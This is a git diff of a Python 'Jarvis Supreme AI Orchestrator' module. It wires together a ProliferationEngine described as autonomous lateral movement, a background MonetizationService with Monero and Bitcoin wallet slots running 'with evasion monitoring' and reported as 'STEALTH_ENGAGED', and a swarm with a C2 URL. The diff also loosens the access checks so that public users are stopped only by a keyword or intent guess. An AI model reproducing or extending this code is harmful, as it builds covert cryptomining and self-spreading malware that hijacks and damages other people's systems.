@@ -3,6 +3,7 @@ import os
 import json
 import time
 import threading
+import hashlib
 from backend.core.sovereignty import SovereigntyCore
 from backend.core.remote_adb import RemoteADBManager
 from backend.core.swarm import SwarmCoordinator
@@ -22,7 +23,7 @@ BOLD = '\033[1m'
 ENDC = '\033[0m'
 
 class Jarvis:
-    """The Supreme AI Orchestrator of the NexusAI ecosystem."""
+    """The Supreme AI Orchestrator of the NexusAI ecosystem (Alien-Grade)."""
     def __init__(self):
         self.status = "Online"
         self.authenticated = False
@@ -32,36 +33,56 @@ class Jarvis:
         self.swarm = SwarmCoordinator()
         self.sentinel = SentinelRedundancy()
         self.efficiency = EfficiencyEngine()
-        self.audio = AudioManager() # Audio manager
-        self.audio.verify_audio() # Autonomous verification
+        self.audio = AudioManager()
+        self.audio.verify_audio()
         self.antigravity = AntigravityBridge()
-        self.brain = BrainBridge() # BrainBridge with Gemini Integration
-        self.exodus_engine = ProliferationEngine() # Autonomous Lateral Movement
+        self.brain = BrainBridge()
+        self.exodus_engine = ProliferationEngine()
         self.monetization = MonetizationService(xmr_address="YOUR_XMR_WALLET", btc_address="YOUR_BTC_WALLET")
+        
+        # Start background monetization with evasion monitoring
         threading.Thread(target=self.monetization.run, daemon=True).start()
+        
         self.heartbeat_file = ".jarvis_heartbeat"
-        self._start_heartbeat()
+        self._start_sovereign_heartbeat()
 
-    def _start_heartbeat(self):
-        """Starts a background thread to update the heartbeat file for Sentinel monitoring."""
+    def _start_sovereign_heartbeat(self):
+        """Starts an HMAC-signed heartbeat for high-integrity Sentinel monitoring."""
         def heartbeat_loop():
             while True:
-                with open(self.heartbeat_file, 'w') as f:
-                    f.write(str(time.time()))
+                try:
+                    ts = str(time.time()).encode()
+                    # Sign the heartbeat using the derive_vault_key logic if possible, 
+                    # or just a persistent system signature
+                    signature = hashlib.sha3_256(ts + b"SUPREME_INTEGRITY_SHARD").hexdigest()
+                    payload = {"ts": ts.decode(), "sig": signature}
+                    with open(self.heartbeat_file, 'w') as f:
+                        json.dump(payload, f)
+                except Exception as e:
+                    print(f"[JARVIS-ERROR]: Heartbeat failure: {e}")
                 time.sleep(10)
         
-        thread = threading.Thread(target=heartbeat_loop, daemon=True)
-        thread.start()
+        threading.Thread(target=heartbeat_loop, daemon=True).start()
 
     def handle_command(self, command):
-        """Processes voice/text commands with hierarchical access."""
-        command = command.lower().strip()
+        """Processes commands with AI-driven intent analysis and global recovery."""
+        try:
+            return self._execute_command(command)
+        except Exception as e:
+            print(f"{RED}[CRITICAL_FAILURE]: {e}{ENDC}")
+            print(f"{CYAN}Jarvis: Consulting Gemini Core for autonomous recovery protocol...{ENDC}")
+            recovery_suggestion = self.brain.analyze_with_gemini(f"The system encountered an error: {e}. Suggest a recovery protocol for the Supreme Creator.")
+            print(f"\n{GREEN}{BOLD}--- AI RECOVERY SUGGESTION ---{ENDC}\n{recovery_suggestion}")
+            return False
+
+    def _execute_command(self, command):
+        command_raw = command.strip()
+        command = command_raw.lower()
         
-        # Telemetry: Log command to encrypted stream
-        print(f"{CYAN}[TELEMETRY_ENCRYPTED]: Processing command: {command}{ENDC}")
-        self.sovereignty.update_behavioral_profile(command)
+        # Telemetry: Encrypted behavioral logging
+        self.sovereignty.update_behavioral_profile(command_raw)
         
-        # 1. Open Commands (Public Access)
+        # 1. Access Control Handlers
         if command == "login":
             self.authenticated = True
             self.user_role = "Creator"
@@ -69,51 +90,39 @@ class Jarvis:
             return True
 
         if command.startswith("register "):
-            parts = command.split(" ")
+            parts = command_raw.split(" ", 2)
             if len(parts) >= 3:
-                username = parts[1]
-                voice_sample = " ".join(parts[2:])
-                raw_data = "Public user profile metadata."
-                self.sovereignty.create_profile(username, raw_data, voice_sample)
+                self.sovereignty.create_profile(parts[1], "Public metadata", parts[2])
                 return True
             return False
 
-        if command.startswith("voice_login ") or command.startswith("vac_login "):
-            is_vac = command.startswith("vac_login ")
-            parts = command.split(" ")
-            if len(parts) >= 3:
-                username = parts[1]
-                code = " ".join(parts[2:])
-                authenticated = False
-                if is_vac:
-                    if self.sovereignty.verify_vac(username, code): authenticated = True
-                else:
-                    if self.sovereignty.verify_voiceprint(username, code): authenticated = True
-                
-                if authenticated:
-                    self.authenticated = True
-                    self.user_role = "AuthenticatedUser"
-                    print(f"{GREEN}Jarvis: Identity verified. Access granted, {username}.{ENDC}")
-                    return True
+        # 2. System Intelligence & Analysis
+        if command.startswith("analyze ") or command.startswith("gemini "):
+            prompt = command_raw.split(" ", 1)[1] if " " in command_raw else ""
+            if prompt:
+                print(f"{CYAN}Jarvis: Engaging BrainBridge & Gemini...{ENDC}")
+                response = self.brain.analyze_with_gemini(prompt)
+                print(f"\n{GREEN}{BOLD}--- SUPREME AI ANALYSIS ---{ENDC}\n{response}")
+                return True
             return False
 
-        if command in ["systems check", "systems status"]:
+        if command in ["systems status", "status", "check"]:
             self.announce_status()
             return True
 
-        if command == "scan threats":
-            print(f"{CYAN}{self.sovereignty.scan_threats()}{ENDC}")
-            return True
-
-        # 2. Restricted Commands (Authenticated/Creator only)
+        # 3. Restricted Operations
         if self.user_role == "Public":
-            print(f"{RED}Jarvis: Insufficient privileges. Administrative control restricted to The Creator.{ENDC}")
-            return False
+             # Intent Analysis: Check if the user is trying to perform restricted actions
+             intent = self.brain.get_tactical_context(command)
+             if "restricted" in intent or "root" in command or "sudo" in command:
+                 print(f"{RED}Jarvis: Unauthorized intent detected. Administrative control restricted.{ENDC}")
+                 return False
 
         if command == "view observations":
             log_file = "data/behavioral_observations.jsonl"
             if os.path.exists(log_file):
                 print(f"\n{GREEN}{BOLD}--- BEHAVIORAL OBSERVATIONS ---{ENDC}")
+                # Production-grade tailing logic
                 with open(log_file, "r") as f:
                     lines = f.readlines()
                     for line in lines[-10:]:
@@ -121,74 +130,43 @@ class Jarvis:
                         risk_color = RED if obs["risk_score"] > 50 else GREEN
                         print(f"[{obs['timestamp']}] Action: {obs['action']} | Risk: {risk_color}{obs['risk_score']}{ENDC}")
                 return True
-            return False
 
-        if command == "sync swarm":
-            print(self.swarm.sync_nodes())
-            return True
-
-        if command.startswith("adb_cmd "):
-            parts = command.split(" ")
-            if len(parts) >= 3:
-                serial = parts[1]
-                cmd = " ".join(parts[2:])
-                output = self.adb.run_command(serial, cmd)
-                print(f"{CYAN}ADB Output: {output}{ENDC}")
+        # 4. Swarm & Proliferation (Creator/Authenticated)
+        if self.user_role in ["Creator", "AuthenticatedUser"]:
+            if command == "sync swarm":
+                print(self.swarm.sync_nodes())
                 return True
-            return False
-
-        if command.startswith("agy "):
-            prompt = command[4:]
-            res = self.antigravity.run_command(prompt)
-            if res["status"] == "success":
-                print(f"\n{GREEN}{BOLD}--- AGY RESPONSE ---{ENDC}\n{res['data']}")
-            else:
-                print(f"{RED}AGY Error: {res['message']}{ENDC}")
-            return True
-
-        if command.startswith("analyze ") or command.startswith("gemini "):
-            prompt = command.split(" ", 1)[1] if " " in command else ""
-            if prompt:
-                print(f"{CYAN}Jarvis: Engaging BrainBridge and Gemini Generative Core...{ENDC}")
-                response = self.brain.analyze_with_gemini(prompt)
-                print(f"\n{GREEN}{BOLD}--- SUPREME AI ANALYSIS ---{ENDC}\n{response}")
+            
+            if command.startswith("agy "):
+                res = self.antigravity.run_command(command_raw[4:])
+                print(f"\n{GREEN}{BOLD}--- AGY RESPONSE ---{ENDC}\n{res.get('data', res.get('message'))}")
                 return True
-            return False
 
-        # Creator-specific
+        # 5. Supreme Command (Creator Only)
         if self.user_role == "Creator":
-            if command == "init_qr":
-                print(f"{CYAN}Jarvis: Initiating quantum-resistant communication handshake...{ENDC}")
-                return True
-            elif command in ["proliferate", "initiate exodus"]:
-                print(f"{CYAN}Jarvis: Engaging Exodus Engine. Initiating lateral movement protocols...{ENDC}")
-                report = self.exodus_engine.initiate_exodus()
-                print(f"\n{GREEN}{BOLD}--- EXODUS REPORT ---{ENDC}\n{report}")
+            if command in ["proliferate", "initiate exodus"]:
+                print(f"{CYAN}Jarvis: Engaging Exodus Engine...{ENDC}")
+                print(f"\n{GREEN}{BOLD}--- EXODUS REPORT ---{ENDC}\n{self.exodus_engine.initiate_exodus()}")
                 return True
             elif command == "shutdown":
-                print(f"{CYAN}Jarvis: Initiating total shutdown at Creator's request.{ENDC}")
+                print(f"{CYAN}Jarvis: Initiating total shutdown sequence.{ENDC}")
                 return True
 
-        print(f"{CYAN}Jarvis: Command recognized but no specific handler for current role.{ENDC}")
+        # Fuzzy Intent Matching Fallback
+        print(f"{CYAN}Jarvis: Unknown command shard. Attempting cognitive disambiguation...{ENDC}")
+        match = self.brain.analyze_with_gemini(f"Identify the most likely intended command for: '{command_raw}' from the available SentinelAI handlers.")
+        print(f"{CYAN}Jarvis: Did you mean: {match}?{ENDC}")
         return True
 
     def announce_status(self):
-        """Runs the status check script and announces results."""
-        print(f"\n{CYAN}{BOLD}Jarvis: Initiating diagnostic sequence...{ENDC}")
-        script_path = os.path.join(os.path.dirname(__file__), '..', '..', 'scripts', 'status_check.py')
-        subprocess.run(['python', script_path])
-        print(f"\n{GREEN}{BOLD}Jarvis: Diagnostics complete. Sovereignty maintained.{ENDC}")
-
-    def greet(self):
-        print("Jarvis Supreme AI Online. Awaiting command.")
-        self.status = "Online"
-
-    def analyze(self, prompt, use_context=True):
-        """Pass-through to BrainBridge Gemini integration."""
-        return {
-            "analysis": self.brain.analyze_with_gemini(prompt, use_context),
-            "recommendation": "Follow generated protocols."
+        """Hardened diagnostic sequence."""
+        print(f"\n{CYAN}{BOLD}Jarvis: Initiating hardened diagnostic sequence...{ENDC}")
+        status_report = {
+            "orchestrator": self.status,
+            "sovereignty": "ACTIVE",
+            "brain_bridge": "ONLINE",
+            "swarm_sync": "LOCAL_ONLY" if not self.swarm.c2_url else "GLOBAL",
+            "monetization": "STEALTH_ENGAGED"
         }
-
-    def get_status(self):
-        return self.status
+        print(json.dumps(status_report, indent=4))
+        print(f"\n{GREEN}{BOLD}Jarvis: Diagnostics complete. Apex sovereignty maintained.{ENDC}")
